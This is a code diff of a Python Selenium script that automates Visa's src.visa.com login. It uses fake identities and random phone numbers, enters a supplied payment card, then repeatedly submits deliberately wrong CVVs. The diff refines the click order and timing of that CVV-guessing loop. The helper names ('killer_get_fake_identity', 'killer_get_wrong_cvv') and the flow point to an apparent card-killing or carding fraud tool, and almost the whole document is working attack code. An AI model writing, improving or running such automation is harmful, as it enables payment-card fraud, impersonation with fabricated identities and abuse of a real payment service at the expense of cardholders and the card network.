@@ -5156,9 +5156,10 @@ def run_kd_process(card_input, update_dict):
         driver.get("https://src.visa.com/login")
 
         # ================================
-        # ✅ COOKIE FIX (FINAL CORRECT)
+        # ✅ COOKIE FIX
         # ================================
         try:
+            time.sleep(2)
             cookie_accept = WebDriverWait(driver, 10).until(
                 EC.element_to_be_clickable((By.CSS_SELECTOR, "a.wscrOk"))
             )
@@ -5168,27 +5169,22 @@ def run_kd_process(card_input, update_dict):
             pass
 
         # ================================
-        # STEP 1 — LOGIN FLOW
+        # STEP 1 — LOGIN
         # ================================
         identity = killer_get_fake_identity()
 
-        # Email
         wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(identity["email"])
 
-        # Continue
         driver.execute_script("arguments[0].click();",
             wait.until(EC.presence_of_element_located((By.XPATH, "//button[.//div[normalize-space()='Continue']]"))))
 
-        # Phone (clean + random)
         phone_input = wait.until(EC.presence_of_element_located((By.ID, "login-phone-input-number")))
         driver.execute_script("arguments[0].value='';", phone_input)
         phone_input.send_keys("202" + "".join(random.choices("0123456789", k=7)))
 
-        # Checkbox
         driver.execute_script("arguments[0].click();",
             wait.until(EC.presence_of_element_located((By.XPATH, "//input[@type='checkbox' and contains(@class,'v-checkbox')]"))))
 
-        # Next
         driver.execute_script("arguments[0].click();",
             wait.until(EC.presence_of_element_located((By.XPATH, "//button[.//div[normalize-space()='Next']]"))))
 
@@ -5212,7 +5208,7 @@ def run_kd_process(card_input, update_dict):
         wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
         wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)
 
-        killer_edit_message(update_dict, "🔓 1 - Login (Unlocked)\n🔓 2 - Card Fill (Unlocked)\n⚙️ 3 - Billing Fill...\n🔒 4 - CVV Try")
+        killer_edit_message(update_dict, "🔓 1 - Login\n🔓 2 - Card Fill\n⚙️ 3 - Billing Fill...")
 
         # ================================
         # STEP 3 — ADDRESS
@@ -5233,34 +5229,36 @@ def run_kd_process(card_input, update_dict):
         wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
         wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])
 
-        # Add Card
-        driver.execute_script("arguments[0].click();",
-            wait.until(EC.presence_of_element_located((By.XPATH, "//div[normalize-space()='Add card']"))))
-
         killer_edit_message(update_dict, "🔓 1 - Login\n🔓 2 - Card Fill\n🔓 3 - Billing Fill\n⚙️ 4 - CVV Try...")
 
         # ================================
-        # STEP 4 — CVV LOOP (UNCHANGED)
+        # STEP 4 — CVV LOOP (UPDATED CLICK ORDER)
         # ================================
-        cvv_results = [wrong_cvv]
-        used_cvvs = {wrong_cvv}
+        cvv_results = []
+        used_cvvs = set()
 
-        for _ in range(7):
-            fake_cvv = killer_get_wrong_cvv(real_cvv)
-            while fake_cvv in used_cvvs:
+        for i in range(8):
+            if i == 0:
+                fake_cvv = wrong_cvv
+            else:
                 fake_cvv = killer_get_wrong_cvv(real_cvv)
+                while fake_cvv in used_cvvs:
+                    fake_cvv = killer_get_wrong_cvv(real_cvv)
+
             used_cvvs.add(fake_cvv)
 
             try:
-                add_btn = wait.until(EC.presence_of_element_located((By.XPATH, "//div[normalize-space()='Add card']")))
                 cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
-
                 cvv_field.click()
                 cvv_field.send_keys(Keys.CONTROL + "a")
                 cvv_field.send_keys(fake_cvv)
 
+                # ✅ CLICK AFTER FILL (YOUR FIX)
+                add_btn = wait.until(EC.presence_of_element_located((By.XPATH, "//div[normalize-space()='Add card']")))
                 driver.execute_script("arguments[0].click();", add_btn)
+
                 cvv_results.append(fake_cvv)
+                time.sleep(1)
 
             except:
                 cvv_results.append("Failed")
